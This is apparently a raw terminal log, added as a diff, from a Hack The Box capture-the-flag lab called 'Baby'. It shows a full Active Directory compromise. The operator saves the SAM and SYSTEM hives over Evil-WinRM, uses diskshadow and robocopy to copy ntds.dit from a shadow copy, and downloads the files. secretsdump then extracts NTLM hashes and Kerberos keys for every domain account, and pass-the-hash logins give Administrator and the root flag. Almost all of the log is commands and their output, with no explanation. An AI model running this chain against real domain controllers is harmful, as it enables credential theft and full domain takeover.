@@ -1,0 +1,305 @@
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> reg save hklm\sam c:\Windows\Tasks\SAM
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> reg save hklm\system c:\Windows\Tasks\SYSTEM
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Windows\Tasks> download SAM                                                                                                                                                                      
+                                                                                                                                                                                                                    
+Info: Downloading C:\Windows\Tasks\SAM to SAM                                                                                                                                                                       
+                                                                                                                                                                                                                    
+Info: Download successful!                                                                                                                                                                                          
+*Evil-WinRM* PS C:\Windows\Tasks> download SYSTEM                                                                                                                                                                   
+
+Info: Downloading C:\Windows\Tasks\SYSTEM to SYSTEM
+
+Info: Download successful!                    
+
+
+*Evil-WinRM* PS C:\Users\Public> upload backup                                                                                                                                                                      
+                                                                                                                                                                                                                    
+Info: Uploading /home/b7h30/Documents/obsidian/docs/CTF/HTB/Baby/loot/backup to C:\Users\Public\backup                                                                                                              
+                                                                                                                                                                                                                    
+Data: 188 bytes of 188 bytes copied                                                                                                                                                                                 
+                                                                                                                                                                                                                    
+Info: Upload successful!                                                                                                                                                                                            
+*Evil-WinRM* PS C:\Users\Public> diskshadow /s backup                                                                                                                                                               
+Microsoft DiskShadow version 1.0                                                                                                  
+Copyright (C) 2013 Microsoft Corporation                                                                                          
+On computer:  BABYDC,  2/7/2026 8:49:30 PM                                                                                        
+                                                                                                                                  
+-> set verbose on                                                                                                                 
+-> set context persistent nowriters                                                                                               
+-> set metadata C:\Windows\Temp\0xdf.cab                                                                                          
+-> add volume c: alias 0xdf                                                                                                       
+-> create                                                                                                                         
+                                                                                                                                  
+Alias 0xdf for shadow ID {2573b881-4d2a-4e58-8ca4-ff38a15a964f} set as environment variable.                                      
+Alias VSS_SHADOW_SET for shadow set ID {24dfc1d3-bdbc-43bf-9986-62b3904844db} set as environment variable.                        
+Inserted file Manifest.xml into .cab file 0xdf.cab                                                                                
+Inserted file Dis81F9.tmp into .cab file 0xdf.cab                                                                                 
+                                                                                                                                  
+Querying all shadow copies with the shadow copy set ID {24dfc1d3-bdbc-43bf-9986-62b3904844db}                                     
+                                                                                                                                  
+        * Shadow copy ID = {2573b881-4d2a-4e58-8ca4-ff38a15a964f}               %0xdf%                                            
+                - Shadow copy set: {24dfc1d3-bdbc-43bf-9986-62b3904844db}       %VSS_SHADOW_SET%                                  
+                - Original count of shadow copies = 1                                                                             
+                - Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]                                   
+                - Creation time: 2/7/2026 8:49:31 PM                                                                              
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1                                        
+                - Originating machine: BabyDC.baby.vl                                                                             
+                - Service machine: BabyDC.baby.vl                                                                                 
+                - Not exposed                                                                                                     
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential                                                            
+
+Number of shadow copies listed: 1
+-> expose %0xdf% e:                       
+-> %0xdf% = {2573b881-4d2a-4e58-8ca4-ff38a15a964f}                                   
+The shadow copy was successfully exposed as e:\.                                     
+->                                        
+->                                        
+*Evil-WinRM* PS C:\Users\Public> ls E:\
+
+
+    Directory: E:\                             
+
+
+Mode                 LastWriteTime         Length Name                                                    
+----                 -------------         ------ ----                                                    
+d-----         8/19/2021   6:24 AM                EFI
+d-----         4/16/2025   9:17 AM                inetpub                                                 
+d-----          5/8/2021   8:20 AM                PerfLogs                                                
+d-r---         4/16/2025   8:35 AM                Program Files
+d-----         4/16/2025   9:38 AM                Program Files (x86)
+d-r---         7/27/2024  10:27 PM                Users                                                   
+d-----         8/20/2025   9:07 AM                Windows     
+
+*Evil-WinRM* PS C:\Users\Public> robocopy /b E:\Windows\ntds . ntds.dit
+
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Saturday, February 7, 2026 8:50:47 PM
+   Source : E:\Windows\ntds\                         
+     Dest : C:\Users\Public\                         
+
+    Files : ntds.dit                                 
+
+  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+
+                           1    E:\Windows\ntds\
+            New File              16.0 m        ntds.dit                                                  
+  0.0%                                               
+  0.3%                                               
+  0.7%                                               
+  1.1%                                               
+  1.5%                                               
+  1.9%                                               
+  2.3%                                               
+  2.7%                                               
+  3.1%                                               
+  3.5%                                               
+  3.9%                                               
+  4.2%                                               
+  4.6%                                               
+  5.0%                                               
+  5.4%                                               
+  5.8%                                               
+  6.2%                                               
+  6.6%                                               
+  7.0%                                               
+  7.4%                                               
+  7.8%                                               
+  8.2%                                               
+  8.5%                                               
+  8.9%                                               
+  9.3%                                               
+  9.7%                                               
+ 10.1%                                               
+ 10.5%                                               
+ 10.9%                    
+ ...
+  98.8%                                                                                                                                                                                                15:51 [5/3425]
+ 99.2%                                                                                                                                                                                                              
+ 99.6%                                                                                                                                                                                                              
+100%                                                                                                                                                                                                                
+100%                                                                                                                                                                                                                
+                                                                                                                                                                                                                    
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         0         1         0         0         0
+   Files :         1         1         0         0         0         0
+   Bytes :   16.00 m   16.00 m         0         0         0         0
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+
+
+   Speed :           41,323,192 Bytes/sec.
+   Speed :            2,364.532 MegaBytes/min.
+   Ended : Saturday, February 7, 2026 8:50:47 PM
+
+*Evil-WinRM* PS C:\Users\Public> cd C:\programdata
+*Evil-WinRM* PS C:\programdata> ls ntds.dit
+Cannot find path 'C:\programdata\ntds.dit' because it does not exist.
+At line:1 char:1                                     
++ ls ntds.dit                                        
++ ~~~~~~~~~~~                                        
+    + CategoryInfo          : ObjectNotFound: (C:\programdata\ntds.dit:String) [Get-ChildItem], ItemNotFoundException                                                                                               
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+*Evil-WinRM* PS C:\programdata> dir
+
+
+    Directory: C:\programdata                        
+
+
+Mode                 LastWriteTime         Length Name                                                    
+----                 -------------         ------ ----                                                    
+d-----        11/17/2021   2:09 AM                Amazon                                                  
+d---s-         9/15/2021   4:52 PM                Microsoft                                               
+d-----         4/16/2025   9:39 AM                Package Cache
+d-----         8/20/2025   8:37 AM                Packages                                                
+d-----         10/4/2024   3:42 PM                regid.1991-06.com.microsoft
+d-----          5/8/2021   8:20 AM                SoftwareDistribution
+d-----          5/8/2021   9:36 AM                ssh
+d-----         9/15/2021   3:10 PM                USOPrivate
+d-----          5/8/2021   8:20 AM                USOShared                                               
+d-----         10/4/2024   2:53 PM                VMware                                                  
+
+
+*Evil-WinRM* PS C:\programdata> cd C:\Users\Public
+*Evil-WinRM* PS C:\Users\Public> dir
+
+
+    Directory: C:\Users\Public
+
+
+Mode                 LastWriteTime         Length Name                                                    
+----                 -------------         ------ ----                                                    
+d-r---         8/18/2021  11:34 PM                Documents                                               
+d-r---          5/8/2021   8:20 AM                Downloads                                               
+d-r---          5/8/2021   8:20 AM                Music                                                   
+d-r---          5/8/2021   8:20 AM                Pictures                                                
+d-r---          5/8/2021   8:20 AM                Videos                                                  
+-a----          2/7/2026   8:48 PM            143 backup                                                  
+-a----          2/7/2026   6:27 PM       16777216 ntds.dit                                                
+-a----          2/7/2026   8:34 PM            168 script.txt
+
+*Evil-WinRM* PS C:\Users\Public> download ntds.dit
+                                        
+Info: Downloading C:\Users\Public\ntds.dit to ntds.dit
+                                        
+Info: Download successful!
+
+
+b7h30@kali:~/Documents/obsidian/docs/CTF/HTB/Baby/loot$ secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL                                                                                                                                         
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                                                              
+                                                                                                                                                                          
+[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88                                                                                                             
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                             
+[*] Searching for pekList, be patient                                                                                                                                     
+[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6                                                                                                         
+[*] Reading and decrypting hashes from ntds.dit                                                                                                                           
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::                                                                                    
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                            
+BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::                                                                                         
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::                                                                                           
+baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::                                                                      
+baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::                                                                             
+baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::                                                                             
+baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::                                                                            
+baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::                                                                              
+baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::                                                                        
+baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::                                                                           
+baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::                                                                            
+baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::                                                                             
+baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:3c387bd06399c49ac18d935208e2ef67:::                                                                       
+[*] Kerberos keys from ntds.dit                                                                                                                                           
+Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4                                                                    
+Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d                                                                                                    
+Administrator:des-cbc-md5:d38cb994ae806b97                                                                                                                                
+BABYDC$:aes256-cts-hmac-sha1-96:1a7d22edfaf3a8083f96a0270da971b4a42822181db117cf98c68c8f76bcf192                                                                          
+BABYDC$:aes128-cts-hmac-sha1-96:406b057cd3a92a9cc719f23b0821a45b                                                                                                          
+BABYDC$:des-cbc-md5:8fef68979223d645                                                                                                                                      
+krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97                                                                           
+krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14                                                                                                           
+krbtgt:des-cbc-md5:d57383f1b3130de5                                                                                                                                       
+baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084                                                       
+baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032                                                                                       
+baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b                                                                                                                   
+baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039                                                              
+baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528                                                                                              
+baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e                                                                                                                          
+baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258                                                              
+baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc                                                                                              
+baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e                                                                                                                          
+baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd                                                             
+baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a                                                     
+baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7                                                                                 
+baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784                       
+baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df                                                       
+baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c                                      
+baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e                                                         
+baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
+baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3                                         
+baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41                                                                               
+baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
+baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
+baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb                                                                                                       
+baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
+baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
+baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84                                                                                                        
+baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
+baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
+baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:30bb8104b6f045aa2f2a77ce69169e459603eef606953a089f65fca84eea6f92                                                                                                  
+baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:87eb2f18c037edf521d206e69f4d45a6
+baby.vl\Caroline.Robinson:des-cbc-md5:b94cdf1cabcd3e1c                                                    
+[*] Cleaning up...            
+
+
+
+b7h30@kali:~/Documents/obsidian/docs/CTF/HTB/Baby/loot$ nxc smb $IP -u administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'
+SMB         10.129.16.61    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.16.61    445    BABYDC           [+] baby.vl\administrator:ee4457ae59f1e3fbd764e33d9cef123d (Pwn3d!)
+                                                                                                                         
+b7h30@kali:~/Documents/obsidian/docs/CTF/HTB/Baby/loot$ evil-winrm -i $IP -u Administrator -h 'ee4457ae59f1e3fbd764e33d9cef123d'
+                                        
+Evil-WinRM shell v3.9
+
+Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-a USERAGENT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [-K TICKET_FILE] [--spn SPN_PREFIX] [-l]
+    -S, --ssl                        Enable ssl
+    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
+    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
+    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
+    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
+        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
+    -K, --ccache TICKET_FILE         Path to Kerberos ticket file (ccache or kirbi format, auto-detected)
+    -e, --executables EXES_PATH      C# executables local path
+    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
+    -U, --url URL                    Remote url endpoint (default /wsman)
+    -u, --user USER                  Username (required if not using kerberos)
+    -p, --password PASS              Password
+    -H, --hash HASH                  NTHash
+    -P, --port PORT                  Remote host port (default 5985)
+    -a, --user-agent USERAGENT       Specify connection user-agent (default Microsoft WinRM Client)
+    -V, --version                    Show version
+    -n, --no-colors                  Disable colors
+    -N, --no-rpath-completion        Disable remote path completion
+    -l, --log                        Log the WinRM session
+    -h, --help                       Display this help message
+                                                                                                                         
+b7h30@kali:~/Documents/obsidian/docs/CTF/HTB/Baby/loot$ evil-winrm -i $IP -u Administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+14406432396b532e8cb30cb72ae4acbb
